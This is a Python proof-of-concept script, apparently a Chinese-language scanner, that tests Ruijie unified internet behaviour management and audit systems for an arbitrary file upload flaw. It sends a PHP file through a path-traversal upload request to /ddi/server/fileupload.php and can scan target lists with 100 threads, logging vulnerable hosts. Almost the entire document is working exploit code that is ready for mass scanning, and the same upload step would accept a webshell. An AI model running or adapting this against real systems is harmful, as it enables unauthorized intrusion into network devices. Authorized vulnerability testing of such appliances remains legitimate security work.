import requests
import argparse
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  # 解除警告

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = """

 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _______     | || | _____  _____ | || |     _____    | || |     _____    | || |     _____    | || |  _________   | |
| | |_   __ \    | || ||_   _||_   _|| || |    |_   _|   | || |    |_   _|   | || |    |_   _|   | || | |_   ___  |  | |
| |   | |__) |   | || |  | |    | |  | || |      | |     | || |      | |     | || |      | |     | || |   | |_  \_|  | |
| |   |  __ /    | || |  | '    ' |  | || |      | |     | || |   _  | |     | || |      | |     | || |   |  _|  _   | |
| |  _| |  \ \_  | || |   \ `--' /   | || |     _| |_    | || |  | |_' |     | || |     _| |_    | || |  _| |___/ |  | |
| | |____| |___| | || |    `.__.'    | || |    |_____|   | || |  `.___.'     | || |    |_____|   | || | |_________|  | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

                                version:1.1.0
                                author:fanerj
    """
    print(banner)


def poc(target):
    payload_url = "/ddi/server/fileupload.php?uploadDir=../../321&name=123.php"
    url = target + payload_url
    headers = {
        "Accept": "text/plain, */*; q=0.01",
        "Content-Disposition": 'form-data; name="file"; filename="111.php"',
        "Content-Type": "image/jpeg"
    }
    data = "<?php phpinfo();?>"

    try:
        res = requests.get(url=target, verify=False, timeout=10)
        res1 = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
        if res.status_code == 200:
            if res1.status_code == 200 and "result" in res1.text:
                logger.info(f"[+] 该url存在任意文件上传漏洞：{target}")
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                logger.info(f"[-] 该url不存在任意文件上传漏洞：{target}")
        else:
            logger.info(f"该url连接失败：{target}")
    except Exception as e:
        logger.error(f"[*] 该url出现错误：{target} - {e}")


def main():
    banner()
    parser = argparse.ArgumentParser(description='锐捷统一上网行为管理与审计系统 任意文件上传漏洞检测')
    parser.add_argument("-u", "--url", dest="url", type=str, help="请输入目标链接")
    parser.add_argument("-f", "--file", dest="file", type=str, help="请输入包含目标链接的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage: python {sys.argv[0]} -h")


if __name__ == "__main__":
    main()
